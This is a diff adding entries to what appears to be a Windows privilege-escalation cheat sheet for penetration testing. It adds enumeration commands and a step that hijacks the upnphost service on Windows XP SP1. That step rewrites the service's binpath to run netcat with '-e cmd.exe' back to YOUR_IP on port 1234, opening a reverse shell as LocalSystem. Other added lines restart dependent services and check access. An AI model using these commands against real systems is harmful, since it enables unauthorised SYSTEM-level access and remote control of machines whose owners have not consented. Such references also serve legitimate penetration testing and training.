@@ -19,6 +19,7 @@ EoP0: System info
 
     Find current user.
     *$ echo %username%*
+    *> getuid*
 
     List all users
     *$ net users*
@@ -28,6 +29,9 @@ EoP0: System info
 
     Network information
     *$ ipconfig /all & route print & arp -a*
+
+    Environment
+    *$ set*
 
     List open connections
     *$ netstat -aton*
@@ -53,6 +57,18 @@ $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe 
     then move new old, and restart the service with:
     *$ wmic service NAMEOFSERVICE call startservice
 net stop [service name] && net start [service name]*
+
+    If you don't have access to vmic, you can do:
+    *$ sc qc upnphost*
+    Windows XP SP1 is known to be vulnerable to EoP in upnphost:
+    *$ sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost*
+
+    If it fails because of a missing dependency:
+    *$ sc config SSDPSRV start= auto
+net start SSDPSRV
+net start upnphost*
 
 EoP2: Find unquoted paths
     *$ wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """*
@@ -284,3 +300,7 @@ AV bypass
 
 Get proof
     *$ echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"*
+
+    Access Check
+    You will probably need to accept the eula first:
+    *$ accesschk.exe /accepteula*
